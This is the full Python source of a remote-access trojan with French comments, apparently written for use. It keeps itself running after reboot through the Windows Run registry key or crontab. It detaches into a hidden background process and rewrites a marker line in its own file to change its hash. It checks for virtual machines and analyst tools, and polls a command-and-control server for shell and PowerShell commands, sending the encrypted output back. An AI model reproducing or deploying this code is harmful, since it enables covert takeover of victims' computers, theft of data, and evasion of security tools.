# ROTATE_MARKER: 39f76621
import os
import sys
import time as t
import random
import subprocess as sp
import threading
import ctypes
import requests as r
import json as j
import warnings
import tempfile as tf
import traceback
from uuid import getnode as mac
from cryptography.fernet import Fernet

# === Suppression des warnings, y compris SyntaxWarning ===
warnings.filterwarnings("ignore")
warnings.filterwarnings("ignore", category=SyntaxWarning)

# === Flags Windows pour exécution fileless ===
DETACHED_PROCESS   = 0x00000008
CREATE_NO_WINDOW   = 0x08000000
F = (DETACHED_PROCESS | CREATE_NO_WINDOW) if os.name == 'nt' else 0

# === Marqueur de rotation pour forcer un hash différent ===
MARKER = "# ROTATE_MARKER:"

def rotate_marker():
    """
    Lit son propre fichier et met à jour la ligne MARQUEUR
    avec une valeur aléatoire pour forcer un nouveau hash.
    """
    path = os.path.abspath(__file__)
    with open(path, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    new_val = ''.join(random.choices('0123456789abcdef', k=8))
    marker_line = f"{MARKER} {new_val}\n"

    for i, line in enumerate(lines):
        if line.startswith(MARKER):
            lines[i] = marker_line
            break
    else:
        lines.insert(0, marker_line)

    tmp = path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f:
        f.writelines(lines)
    os.replace(tmp, path)

def rotate_loop():
    """Boucle démon qui met à jour le MARQUEUR toutes les 2 minutes."""
    while True:
        t.sleep(120)
        rotate_marker()

threading.Thread(target=rotate_loop, daemon=True).start()

def install_persistence():
    """
    Persistance au démarrage :
    - Windows : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    - POSIX : crontab @reboot
    """
    try:
        if os.name == 'nt':
            import winreg
            exe = sys.executable
            script = os.path.abspath(__file__)
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "PythonAgent", 0, winreg.REG_SZ, f'"{exe}" "{script}"')
            winreg.CloseKey(key)
        else:
            p = sp.Popen(['crontab', '-l'], stdout=sp.PIPE, stderr=sp.DEVNULL, text=True)
            existing, _ = p.communicate()
            line = f"@reboot {sys.executable} {os.path.abspath(__file__)}\n"
            if line not in existing:
                new = existing + line
                sp.Popen(['crontab', '-'], stdin=sp.PIPE, text=True).communicate(new)
    except:
        pass

def spawn_fileless():
    """Relance en mémoire, ferme le parent sans console."""
    if os.environ.get("INJECTED") != "1":
        env = os.environ.copy()
        env["INJECTED"] = "1"
        if os.name == 'nt':
            exe = sys.executable
            base, name = os.path.split(exe)
            if name.lower() == 'python.exe':
                pw = os.path.join(base, 'pythonw.exe')
                if os.path.exists(pw):
                    exe = pw
            sp.Popen(
                [exe, os.path.abspath(__file__)],
                creationflags=DETACHED_PROCESS,
                env=env,
                close_fds=True
            )
            os._exit(0)
        else:
            try:
                pid = os.fork()
                if pid > 0:
                    os._exit(0)
            except OSError:
                os._exit(1)
            os.setsid()
            try:
                pid = os.fork()
                if pid > 0:
                    os._exit(0)
            except OSError:
                os._exit(1)
            os.umask(0)
            os.chdir('/')
            os.execve(sys.executable,
                      [sys.executable, os.path.abspath(__file__)],
                      env)

# === Hook global pour intercepter toutes les exceptions non gérées ===
def handle_exception(exc_type, exc_value, exc_tb):
    if issubclass(exc_type, KeyboardInterrupt):
        return
    err = "".join(traceback.format_exception(exc_type, exc_value, exc_tb))
    try:
        # Envoi de l'erreur au serveur (utilise la même encryption qu'x2)
        payload = {"data": cipher.encrypt(err.encode()).decode()}
        headers = {"Content-Type": "application/json"}
        r.post(f"{U}/report", data=j.dumps(payload), headers=headers,
               verify=False, timeout=10)
    except:
        pass
    # Ne rien afficher localement

sys.excepthook = handle_exception

# === Détection d'environnements hostiles ===
def is_vm():
    try:
        out = sp.check_output("systeminfo", shell=True).decode().lower()
        return any(k in out for k in ["virtualbox","vmware","hyper-v","kvm","xen"])
    except:
        return False

def low_resolution():
    try:
        user32 = ctypes.windll.user32
        return user32.GetSystemMetrics(0) < 800 or user32.GetSystemMetrics(1) < 600
    except:
        return False

def analyst_tools_running():
    tools = ["wireshark","procmon","fiddler","tcpview"]
    try:
        procs = sp.check_output("tasklist", shell=True).decode().lower()
        return any(tool in procs for tool in tools)
    except:
        return False

# === Globals & chiffrement ===
U = "https://192.168.119.1:443/api"
C = os.getcwd()
M = "cmd"
P = None
k = b'm6M8_PeZaKoKIGAv1uMDnvLqf61dHJdlt1QuVuW6-Zs='
cipher = Fernet(k)

def x1():
    try:
        Q = r.get(f"{U}/status", verify=False, timeout=10)
        if Q.status_code == 200:
            return cipher.decrypt(Q.json().get("data","").encode()).decode()
    except:
        pass
    return None

def x2(cmd, res, _):
    try:
        payload = {"data": cipher.encrypt(res.encode()).decode()}
        headers = {"Content-Type":"application/json"}
        r.post(f"{U}/report", data=j.dumps(payload),
               headers=headers, verify=False, timeout=10)
    except:
        pass

def x3(cmd):
    global P
    try:
        P.stdin.write(f"{cmd}; Write-Output '__END__'\n")
        P.stdin.flush()
        buf = []
        while True:
            line = P.stdout.readline()
            if not line or line.strip()=="__END__":
                break
            buf.append(line)
        return "".join(buf)
    except:
        return "null"

def x4(cmd):
    global C, M, P
    cmd = cmd.strip()
    if M == "powershell":
        if cmd.lower()=="cmd":
            try:
                P.stdin.write("exit"); P.stdin.flush(); P.terminate()
            except: pass
            P=None; M="cmd"
            return "Retour CMD", False
        return x3(cmd), False

    if cmd.lower().startswith("powershell"):
        try:
            P = sp.Popen(
                ["powershell.exe","-NoExit","-NoLogo","-Command","-"],
                stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT,
                text=True, bufsize=1, creationflags=F
            )
            M="powershell"
            parts = cmd.split(maxsplit=1)
            return x3(parts[1]) if len(parts)>1 else "PS lancé", False
        except:
            return "null", False

    if cmd.lower().startswith("cd"):
        parts = cmd.split(maxsplit=1)
        try:
            target = os.path.abspath(os.path.join(C, parts[1])) if len(parts)>1 else C
            if os.path.isdir(target):
                C = target
                return f"Changé: {C}", False
            return f"Dossier introuvable: {target}", False
        except:
            return "Erreur CD", False

    try:
        proc = sp.run(cmd, shell=True, capture_output=True, text=True,
                      cwd=C, creationflags=F)
        return proc.stdout + proc.stderr, False
    except:
        return "null", False

def x6():
    while True:
        cmd = x1()
        if cmd:
            res, _ = x4(cmd)
            x2(cmd, res, _)
        t.sleep(3)

def lancer_agent_fileless():
    try:
        x6()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    install_persistence()      # persistance au reboot
    spawn_fileless()           # fileless + fermeture du parent
    lancer_agent_fileless()    # boucle principale
